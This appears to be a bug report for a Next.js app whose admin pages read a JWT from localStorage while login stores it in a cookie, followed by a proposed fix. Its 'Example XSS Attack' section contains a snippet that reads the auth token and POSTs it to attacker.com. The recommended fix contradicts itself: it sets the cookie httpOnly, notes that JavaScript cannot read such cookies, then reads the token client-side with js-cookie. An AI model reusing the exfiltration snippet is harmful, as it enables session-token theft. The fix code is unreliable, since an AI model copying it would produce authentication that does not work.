# 🔐 Critical Security: Auth Token Desync - localStorage vs Cookies

## Problem Description

### What is happening

The application has a **critical authentication inconsistency** where different parts of the frontend store and retrieve JWT tokens from different locations. The login page stores tokens in **HTTP-only cookies** (required for Next.js middleware), but admin pages attempt to retrieve tokens from **localStorage**, resulting in `Authorization: Bearer undefined` headers and failed API requests.

### Where it is happening

- **Login Page**: `apps/web/src/app/(auth)/login/page.tsx` - Stores token in **cookies**
- **Admin Pages**: `apps/web/src/app/(dashboard)/admin/scores/page.tsx` - Reads from **localStorage**
- **API Requests**: All admin API calls fail with **401 Unauthorized**
- **Middleware**: Next.js middleware expects cookies (correct approach)

### Why it is a problem

This is a **critical functional and security issue** that:

- ✗ Breaks all admin functionality (cannot make authenticated API requests)
- ✗ Creates inconsistent authentication state across the application
- ✗ Prevents admins from managing results, users, facilities, etc.
- ✗ May expose tokens to XSS attacks if localStorage is used
- ✗ Violates Next.js best practices for authentication
- ✗ Creates confusion for developers maintaining the codebase

### Who is affected

- **All Admin Users**: Cannot access admin features after login
- **Development Team**: Inconsistent patterns make debugging difficult
- **Security**: Potential XSS vulnerability if localStorage is used
- **User Experience**: Login appears successful but features don't work

---

## Root Cause Analysis

### The Issue: Token Storage Mismatch

**Login Page (Correct Approach)**:

```typescript
// apps/web/src/app/(auth)/login/page.tsx
const res = await fetch(`${API_URL}/auth/login`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email, password }),
  credentials: "include", // ✅ Stores token in HTTP-only cookie
});

// Token is automatically stored in cookie by browser
// No manual localStorage.setItem() call
```

**Admin Pages (Incorrect Approach)**:

```typescript
// apps/web/src/app/(dashboard)/admin/scores/page.tsx
const token = localStorage.getItem("auth_token"); // ❌ Reads from localStorage

const res = await fetch(`${API_URL}/results`, {
  headers: {
    Authorization: `Bearer ${token}`, // ❌ token is null/undefined
  },
});
```

### What Happens

1. **User logs in** → Token stored in **cookie** ✅
2. **User navigates to admin page** → Code tries to read from **localStorage** ❌
3. **localStorage is empty** → `token = null`
4. **API request sent** → `Authorization: Bearer null`
5. **Backend rejects request** → `401 Unauthorized`
6. **Admin features broken** → User sees errors

### Why This Is Dangerous

**Security Implications**:

- **Cookies (HTTP-only)**: ✅ Cannot be accessed by JavaScript → XSS protection
- **localStorage**: ❌ Accessible by any JavaScript → Vulnerable to XSS attacks

**Example XSS Attack**:

```javascript
// Malicious script injected via XSS
const stolenToken = localStorage.getItem("auth_token");
fetch("https://attacker.com/steal", {
  method: "POST",
  body: JSON.stringify({ token: stolenToken }),
});
// Attacker now has user's JWT token
```

---

## Steps to Reproduce

### Setup

1. Start backend and frontend
2. Navigate to login page
3. Open browser DevTools → Application tab

### Reproduction

1. **Log in with valid credentials**
2. **Check cookie storage**:

   - Application → Cookies → `http://localhost:3000`
   - Observe `auth_token` cookie exists ✅

3. **Check localStorage**:

   - Application → Local Storage → `http://localhost:3000`
   - Observe `auth_token` is **NOT** in localStorage ❌

4. **Navigate to admin page** (e.g., `/admin/scores`)
5. **Open Network tab**
6. **Observe API request**:

   - Request headers show: `Authorization: Bearer null` or `Authorization: Bearer undefined`
   - Response: `401 Unauthorized`

7. **Check console**:
   - Error: "Failed to fetch results" or similar

### Verification

```javascript
// In browser console on admin page
console.log("Cookie:", document.cookie); // Shows auth_token
console.log("localStorage:", localStorage.getItem("auth_token")); // null
```

---

## Impact Assessment

### Functional Impact

- **Severity**: Critical
- **Frequency**: Every admin action (100% failure rate)
- **Workaround**: None for end users

### Security Impact

- **Current State**: Using cookies (secure) ✅
- **If localStorage is used**: Vulnerable to XSS attacks ❌
- **Inconsistency**: Creates confusion about security model

### User Experience Impact

- Login appears successful (no error)
- Admin pages load but features don't work
- Confusing error messages ("Unauthorized" after logging in)
- Users may think their accounts are broken

---

## Scope & Constraints

### ✅ In Scope

- Update all admin pages to read token from cookies
- Create utility function for consistent token retrieval
- Remove any localStorage usage for auth tokens
- Update API request helpers to use cookies
- Test all admin features after fix
- Document authentication approach

### ❌ Out of Scope

- Changing backend authentication logic (already correct)
- Implementing new authentication methods
- Refactoring entire auth system
- Adding new security features (separate issues)

### 📋 Assumptions

- Backend sets `auth_token` cookie correctly
- Cookie is HTTP-only and Secure (in production)
- Next.js middleware uses cookies (correct approach)
- All admin pages should use the same auth method

### 🔗 Dependencies

- Requires `js-cookie` or similar library for cookie access
- May need to update Next.js middleware configuration
- All admin pages must be updated consistently

---

## Acceptance Criteria

This issue is considered **resolved** when:

- [ ] **Token Storage**

  - [ ] Auth token stored ONLY in HTTP-only cookies
  - [ ] No auth tokens in localStorage
  - [ ] Cookie has appropriate security flags (HttpOnly, Secure, SameSite)

- [ ] **Token Retrieval**

  - [ ] All admin pages read token from cookies
  - [ ] Consistent utility function used across all pages
  - [ ] No direct `localStorage.getItem('auth_token')` calls

- [ ] **API Requests**

  - [ ] All authenticated requests include valid token
  - [ ] Authorization header format: `Bearer <valid_token>`
  - [ ] No `Bearer undefined` or `Bearer null` in requests

- [ ] **Functionality**

  - [ ] Admin can view results
  - [ ] Admin can upload results
  - [ ] Admin can delete results
  - [ ] All admin features work after login
  - [ ] No 401 errors for authenticated users

- [ ] **Code Quality**

  - [ ] Centralized auth utility created
  - [ ] All pages use the same auth pattern
  - [ ] No duplicate token retrieval logic
  - [ ] Code is well-documented

- [ ] **Testing**

  - [ ] Login and access admin features
  - [ ] Refresh page and verify still authenticated
  - [ ] Logout and verify token is removed
  - [ ] Test across all admin pages
  - [ ] Test in different browsers

- [ ] **Documentation**
  - [ ] Authentication approach documented
  - [ ] Cookie security settings documented
  - [ ] Developer guide updated

---

## Suggested Labels

- `bug` - Defect in functionality
- `critical` - Blocks core features
- `security` - Security implications
- `frontend` - Frontend code changes
- `authentication` - Auth system issue
- `admin` - Affects admin features
- `high-priority` - Must fix immediately
- `production-blocker` - Cannot deploy without fix

---

## Priority

**🔴 CRITICAL**

**Justification**:

- Completely blocks all admin functionality
- Affects all admin users
- Security implications (localStorage vs cookies)
- No workaround available
- Must be fixed before production deployment

---

## Environment

- **Branch**: All branches (affects core auth logic)
- **Environment**: All environments (local, staging, production)
- **Framework**: Next.js 14+ (App Router)
- **Affected Pages**: All admin pages under `/admin/*`
- **Browser**: All browsers

---

## Recommended Fix (Implementation Guidance)

### Step 1: Install Cookie Library

```bash
cd apps/web
npm install js-cookie
npm install -D @types/js-cookie
```

### Step 2: Create Auth Utility

**File**: `apps/web/src/lib/auth.ts`

```typescript
import Cookies from "js-cookie";

/**
 * Get authentication token from HTTP-only cookie
 * Note: HTTP-only cookies cannot be accessed directly by JavaScript
 * This function is for client-side components that need to read the token
 */
export function getAuthToken(): string | null {
  // For client-side components
  if (typeof window !== "undefined") {
    return Cookies.get("auth_token") || null;
  }
  return null;
}

/**
 * Get auth token for server components
 */
export function getServerAuthToken(cookieHeader: string): string | null {
  const cookies = cookieHeader.split(";").reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split("=");
    acc[key] = value;
    return acc;
  }, {} as Record<string, string>);

  return cookies["auth_token"] || null;
}

/**
 * Remove auth token (logout)
 */
export function removeAuthToken(): void {
  Cookies.remove("auth_token");
}

/**
 * Check if user is authenticated
 */
export function isAuthenticated(): boolean {
  return !!getAuthToken();
}
```

### Step 3: Create API Client Utility

**File**: `apps/web/src/lib/api-client.ts`

```typescript
import { getAuthToken } from "./auth";

const API_URL =
  process.env.NEXT_PUBLIC_API_URL || "http://localhost:8080/api/v1";

export async function authenticatedFetch(
  endpoint: string,
  options: RequestInit = {}
): Promise<Response> {
  const token = getAuthToken();

  const headers = {
    "Content-Type": "application/json",
    ...options.headers,
  };

  // Add Authorization header if token exists
  if (token) {
    headers["Authorization"] = `Bearer ${token}`;
  }

  const response = await fetch(`${API_URL}${endpoint}`, {
    ...options,
    headers,
    credentials: "include", // Include cookies
  });

  // Handle 401 Unauthorized
  if (response.status === 401) {
    // Redirect to login
    window.location.href = "/login";
    throw new Error("Unauthorized");
  }

  return response;
}
```

### Step 4: Update Admin Pages

**File**: `apps/web/src/app/(dashboard)/admin/scores/page.tsx`

**Before (Broken)**:

```typescript
const token = localStorage.getItem("auth_token"); // ❌

const res = await fetch(`${API_URL}/results`, {
  headers: {
    Authorization: `Bearer ${token}`,
  },
});
```

**After (Fixed)**:

```typescript
import { authenticatedFetch } from "@/lib/api-client";

// Option 1: Use utility function
const res = await authenticatedFetch("/results");

// Option 2: Manual (if needed)
import { getAuthToken } from "@/lib/auth";

const token = getAuthToken(); // ✅ Reads from cookie
const res = await fetch(`${API_URL}/results`, {
  headers: {
    Authorization: `Bearer ${token}`,
  },
  credentials: "include",
});
```

### Step 5: Update Login Page (Verify Cookie Setting)

**File**: `apps/web/src/app/(auth)/login/page.tsx`

Ensure backend sets cookie correctly:

```typescript
const res = await fetch(`${API_URL}/auth/login`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email, password }),
  credentials: "include", // ✅ Essential for cookies
});

if (res.ok) {
  const data = await res.json();

  // ❌ DO NOT DO THIS:
  // localStorage.setItem('auth_token', data.access_token);

  // ✅ Cookie is automatically set by backend
  // Just redirect to admin
  router.push("/admin");
}
```

### Step 6: Update Backend (Verify Cookie Setting)

**File**: `apps/api/src/auth/auth.controller.ts`

```typescript
@Post('login')
async login(@Body() loginDto: LoginDto, @Res({ passthrough: true }) response: Response) {
  const result = await this.authService.login(loginDto.email, loginDto.password);

  // Set HTTP-only cookie
  response.cookie('auth_token', result.access_token, {
    httpOnly: true, // ✅ Cannot be accessed by JavaScript
    secure: process.env.NODE_ENV === 'production', // ✅ HTTPS only in production
    sameSite: 'strict', // ✅ CSRF protection
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
  });

  return {
    message: 'Login successful',
    user: result.user,
  };
}
```

### Step 7: Update All Admin Pages

Search and replace across all admin pages:

```bash
# Find all localStorage usage
grep -r "localStorage.getItem('auth_token')" apps/web/src/

# Replace with utility function
# Update each file to use authenticatedFetch or getAuthToken
```

**Files to Update**:

- `apps/web/src/app/(dashboard)/admin/scores/page.tsx`
- `apps/web/src/app/(dashboard)/admin/users/page.tsx`
- `apps/web/src/app/(dashboard)/admin/facilities/page.tsx`
- Any other admin pages

### Step 8: Update Logout Functionality

**File**: `apps/web/src/components/logout-button.tsx` (or similar)

```typescript
import { removeAuthToken } from "@/lib/auth";

const handleLogout = async () => {
  // Call backend logout endpoint
  await fetch(`${API_URL}/auth/logout`, {
    method: "POST",
    credentials: "include",
  });

  // Remove cookie
  removeAuthToken();

  // Redirect to login
  router.push("/login");
};
```

---

## Security Best Practices

### ✅ Implemented in Fix

- HTTP-only cookies (XSS protection)
- Secure flag in production (HTTPS only)
- SameSite=strict (CSRF protection)
- No localStorage for sensitive tokens
- Consistent auth pattern across app

### ⚠️ Additional Recommendations

- **Token Rotation**: Refresh tokens periodically
- **CSRF Tokens**: Additional CSRF protection for state-changing operations
- **Session Management**: Track active sessions in database
- **Logout All Devices**: Allow users to invalidate all sessions
- **Security Headers**: Set appropriate CSP, X-Frame-Options, etc.

---

## Testing Checklist

- [ ] Login stores token in cookie (not localStorage)
- [ ] Admin pages can access protected resources
- [ ] Authorization header includes valid token
- [ ] No `Bearer undefined` in requests
- [ ] Refresh page maintains authentication
- [ ] Logout removes cookie
- [ ] Cannot access admin pages after logout
- [ ] Works in Chrome, Firefox, Safari, Edge
- [ ] Works in incognito/private mode
- [ ] Cookie has correct security flags

---

## Migration Guide

If localStorage was previously used:

```typescript
// Clear any existing localStorage tokens
localStorage.removeItem("auth_token");

// Users will need to log in again
// Cookies will be set on next login
```

---

## Related Issues

- **2FA Bypass** (auth flow improvements)
- **Port & Path Mismatch** (API URL configuration)
- **CORS Configuration** (cookie handling across origins)

---

## Additional Context

### Why Cookies Are Better Than localStorage

| Feature                 | HTTP-only Cookies | localStorage |
| ----------------------- | ----------------- | ------------ |
| XSS Protection          | ✅ Yes            | ❌ No        |
| CSRF Protection         | ✅ With SameSite  | ❌ No        |
| Auto-sent with requests | ✅ Yes            | ❌ Manual    |
| Works with SSR          | ✅ Yes            | ❌ No        |
| Next.js Middleware      | ✅ Yes            | ❌ No        |

### Next.js Best Practices

- Use HTTP-only cookies for authentication
- Use middleware for route protection
- Never store sensitive data in localStorage
- Use server components when possible

---

**Issue Created**: 2025-12-29  
**Reported By**: Development Team  
**Severity**: Critical - Blocks admin functionality  
**Estimated Fix Time**: 2-3 hours  
**Testing Time**: 1 hour
